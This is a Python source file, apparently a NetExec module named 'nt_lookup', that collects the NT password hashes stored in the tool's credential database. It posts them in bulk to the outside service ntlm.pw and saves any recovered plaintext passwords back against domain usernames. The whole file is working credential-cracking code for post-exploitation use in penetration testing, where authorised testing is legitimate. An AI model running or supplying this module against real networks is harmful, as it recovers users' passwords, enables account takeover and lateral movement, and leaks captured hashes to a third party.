import requests


class NXCModule:
    """
    Check database NT hashes against online lookup tables at https://ntlm.pw.
    Module by @m4lwhere
    """

    name = "nt_lookup"
    description = "Lookup NT hashes in database on https://ntlm.pw"
    supported_protocols = ["smb"]
    opsec_safe = False
    multiple_hosts = False

    def __init__(self, context=None, module_options=None):
        self.server = None
        self.context = context
        self.module_options = module_options
    
    def options(self, context, module_options):
        self.output = "Test lookup"

    def on_login(self, context, connection):
        all_creds = context.db.get_credentials()

        nt_hashes = []

        # Create list of NT hashes from db
        for cred in all_creds:
            if cred[4] == "hash":
                ntlm = cred[3].split(":")
                nt = ntlm[1]
                nt_hashes.append(nt)

        context.log.debug(nt_hashes)

        # Remove NT hash duplicates
        uniq_nt_hashes = list(set(nt_hashes))
        context.log.highlight(f"Gathered {len(nt_hashes)} NT hashes from database, {len(uniq_nt_hashes)} unique hashes")

        # Send the request to check ntlm.pw database
        url = "https://ntlm.pw/api/bulklookup"
        headers = {"Content-Type":"text/plain"}
        data_string = "\n".join(map(str, uniq_nt_hashes))

        context.log.debug(data_string)

        response = requests.post(url, data=data_string, headers=headers)

        if response.status_code == 429:
            context.log.fail("Not enough credits for ntlm.pw! Wait 1-15 mins and try again!")
        
        context.log.debug(response.text)

        answers = response.text.split("\n")

        # Remove the last item as it's only an empty line from response
        answers.pop()

        plaintext_passwords = {}

        context.log.debug(answers)

        for answer in answers:
            hash_answer = answer.split(":", maxsplit=1)
            context.log.debug(hash_answer)
            if hash_answer[1] != "[not found]":
                plaintext_passwords[hash_answer[0]] = hash_answer[1]
        
        context.log.highlight(f"Found {len(plaintext_passwords)} hashes in the https://ntlm.pw database!")

        new_plaintext_count = 0
        for key, value in plaintext_passwords.items():
            context.log.debug(f"{key}:{value}")

            # Find any matching users with gathered hashes
            for cred in all_creds:
                if key in cred[3]:
                    domain, username = cred[1], cred[2]
                    context.log.highlight(f"Found matching user {domain}\\{username}:{value} ({key})")
                    context.db.add_credential("plaintext", domain, username, value)

                    new_plaintext_count += 1
            
        context.log.highlight(f"Added {new_plaintext_count} passwords to database!")
